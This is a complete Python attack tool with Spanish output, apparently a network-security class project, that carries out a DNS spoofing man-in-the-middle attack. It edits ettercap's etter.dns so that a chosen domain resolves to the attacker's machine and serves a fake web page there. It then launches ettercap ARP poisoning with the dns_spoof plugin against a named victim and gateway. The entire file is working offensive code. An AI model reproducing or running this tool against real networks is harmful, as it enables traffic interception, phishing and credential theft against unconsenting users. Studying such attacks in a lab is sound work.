#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import subprocess
import signal
import shutil
import time
import re
import threading
import itertools

RED = '\033[0;31m'
GREEN = '\033[0;32m'
YELLOW = '\033[1;33m'
CYAN = '\033[0;36m'
MAGENTA = '\033[0;35m'
BOLD = '\033[1m'
NC = '\033[0m'

ETTER_DNS = '/etc/ettercap/etter.dns'
ETTER_DNS_BACKUP = '/tmp/etter.dns.bak'

pids = []
webserver_proc = None
spinner_stop = threading.Event()

def cleanup(signum=None, frame=None):
    spinner_stop.set()
    print(f"\n{YELLOW}[*] Deteniendo ataque y limpiando...{NC}")
    for pid in pids:
        try:
            os.kill(pid, signal.SIGTERM)
        except:
            pass

    if os.path.exists(ETTER_DNS_BACKUP):
        try:
            shutil.copy(ETTER_DNS_BACKUP, ETTER_DNS)
            os.remove(ETTER_DNS_BACKUP)
            print(f"{GREEN}[OK] etter.dns restaurado.{NC}")
        except Exception as e:
            print(f"{RED}[ERROR] No se pudo restaurar etter.dns: {e}{NC}")

    print(f"{GREEN}[OK] Limpieza completa.{NC}")
    sys.exit(0)

signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)

def check_root():
    if os.geteuid() != 0:
        print(f"{RED}[ERROR]{NC} Ejecuta como root (sudo).")
        sys.exit(1)

def check_dependencies():
    required = ['ettercap', 'python3']
    missing = [b for b in required if shutil.which(b) is None]
    if missing:
        print(f"{RED}[ERROR]{NC} Faltan los siguientes binarios: {', '.join(missing)}")
        sys.exit(1)
    if not os.path.exists(ETTER_DNS):
        print(f"{RED}[ERROR]{NC} No existe {ETTER_DNS}.")
        sys.exit(1)

def get_interfaces():
    try:
        output = subprocess.check_output(['ip', '-brief', 'link', 'show'], text=True)
        return [l.split()[0] for l in output.strip().split('\n') if l.split() and l.split()[0] != 'lo']
    except:
        return []

def get_ip(iface):
    try:
        output = subprocess.check_output(['ip', '-4', 'addr', 'show', iface], text=True)
        match = re.search(r'inet\s+(\d+\.\d+\.\d+\.\d+)', output)
        return match.group(1) if match else None
    except:
        return None

def write_etter_dns(domain, attacker_ip):
    shutil.copy(ETTER_DNS, ETTER_DNS_BACKUP)
    with open(ETTER_DNS, 'a') as f:
        f.write(f"\n{domain}      A  {attacker_ip}\n")
        f.write(f"*.{domain}    A  {attacker_ip}\n")

def banner():
    print(f"{MAGENTA}{BOLD}")
    print("  ██████╗ ███╗   ██╗███████╗    ███████╗██████╗  ██████╗  ██████╗ ███████╗")
    print("  ██╔══██╗████╗  ██║██╔════╝    ██╔════╝██╔══██╗██╔═══██╗██╔═══██╗██╔════╝")
    print("  ██║  ██║██╔██╗ ██║███████╗    ███████╗██████╔╝██║   ██║██║   ██║█████╗  ")
    print("  ██║  ██║██║╚██╗██║╚════██║    ╚════██║██╔═══╝ ██║   ██║██║   ██║██╔══╝  ")
    print("  ██████╔╝██║ ╚████║███████║    ███████║██║     ╚██████╔╝╚██████╔╝██║     ")
    print("  ╚═════╝ ╚═╝  ╚═══╝╚══════╝    ╚══════╝╚═╝      ╚═════╝  ╚═════╝ ╚═╝     ")
    print(f"{NC}{CYAN}              Miguel Ramirez Meli · Seguridad de Redes{NC}\n")

def spinner(msg):
    frames = itertools.cycle(['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏'])
    while not spinner_stop.is_set():
        sys.stdout.write(f"\r{CYAN}{next(frames)}{NC} {msg}")
        sys.stdout.flush()
        time.sleep(0.08)
    sys.stdout.write("\r" + " " * (len(msg) + 4) + "\r")

def parse_ettercap_line(line, domain, attacker_ip):
    line = line.strip()
    if not line:
        return None

    if 'ARP poisoning victims' in line:
        return f"{YELLOW}[ARP]{NC} Envenenando cache ARP..."

    m = re.search(r'GROUP\s+\d+\s*:\s*([\d.]+)\s+([0-9A-Fa-f:]+)', line)
    if m:
        ip, mac = m.group(1), m.group(2)
        return f"     {CYAN}→{NC} {BOLD}{ip}{NC}  (MAC falseada: {mac})"

    if 'Starting Unified sniffing' in line:
        return f"{YELLOW}[MITM]{NC} Interceptando trafico bidireccional..."

    if 'Activating dns_spoof' in line:
        return f"{YELLOW}[DNS]{NC} Plugin dns_spoof activo, esperando consultas..."

    if 'dns_spoof' in line and ('spoofed' in line or 'A ' in line):
        return f"{GREEN}{BOLD}[HIT]{NC} Consulta DNS interceptada -> {domain} spoofeado a {attacker_ip}"

    return None

def run_ettercap(iface, victim_ip, gateway_ip, domain, attacker_ip):
    cmd = [
        'ettercap', '-T', '-q', '-i', iface,
        '-P', 'dns_spoof',
        '-M', 'arp:remote',
        f"//{victim_ip}/", f"//{gateway_ip}/"
    ]

    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
    pids.append(proc.pid)

    t = threading.Thread(target=spinner, args=("Iniciando ataque MITM...",), daemon=True)
    t.start()
    first_event = True

    for line in proc.stdout:
        formatted = parse_ettercap_line(line, domain, attacker_ip)
        if formatted:
            if first_event:
                spinner_stop.set()
                t.join()
                print(f"{CYAN}{BOLD}--- LOG DE ATAQUE ---{NC}")
                first_event = False
            print(formatted)

def main():
    global webserver_proc

    check_root()
    check_dependencies()
    banner()

    webdir = input("Ruta del directorio con el index.html a servir: ").strip()
    if not os.path.isdir(webdir) or not os.path.isfile(os.path.join(webdir, 'index.html')):
        print(f"{RED}[ERROR]{NC} Directorio o index.html invalido.")
        sys.exit(1)

    target_domain = input("Dominio/URL a spoofear (ej. itla.edu.do): ").strip()
    if not target_domain:
        print(f"{RED}[ERROR]{NC} Debes ingresar un dominio.")
        sys.exit(1)

    ifaces = get_interfaces()
    if ifaces:
        print(f"{YELLOW}Interfaces disponibles:{NC} {', '.join(ifaces)}")
    iface = input("Interfaz de red a usar: ").strip()
    if not iface:
        print(f"{RED}[ERROR]{NC} Debes especificar una interfaz.")
        sys.exit(1)

    attacker_ip = get_ip(iface)
    if not attacker_ip:
        attacker_ip = input(f"No se detecto IP en {iface}, ingresala manualmente: ").strip()

    victim_ip = input("IP de la victima: ").strip()
    gateway_ip = input("IP del gateway/DNS legitimo: ").strip()
    if not victim_ip or not gateway_ip:
        print(f"{RED}[ERROR]{NC} Debes ingresar IP de victima y gateway.")
        sys.exit(1)

    print("")
    print(f"{CYAN}{BOLD}--------------- RESUMEN ---------------{NC}")
    print(f"Web dir      : {GREEN}{webdir}{NC}")
    print(f"Dominio      : {GREEN}{target_domain}{NC} -> {GREEN}{attacker_ip}{NC}")
    print(f"Interfaz     : {GREEN}{iface}{NC}")
    print(f"IP atacante  : {GREEN}{attacker_ip}{NC}")
    print(f"Victima      : {GREEN}{victim_ip}{NC}")
    print(f"Gateway      : {GREEN}{gateway_ip}{NC}")
    print(f"{CYAN}{BOLD}----------------------------------------{NC}")

    confirm = input("Quieres iniciar el ataque? (s/n): ").strip().lower()
    if confirm != 's':
        print("Cancelado.")
        sys.exit(0)

    write_etter_dns(target_domain, attacker_ip)

    webserver_proc = subprocess.Popen(
        ['python3', '-m', 'http.server', '80'],
        cwd=webdir, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    pids.append(webserver_proc.pid)
    time.sleep(1)

    print(f"\n{GREEN}{BOLD}[OK] Servidor web falso activo en {webdir}{NC}")
    print(f"{YELLOW}Presiona CTRL+C para detener el ataque en cualquier momento.{NC}\n")

    run_ettercap(iface, victim_ip, gateway_ip, target_domain, attacker_ip)
    cleanup()

if __name__ == '__main__':
    main()
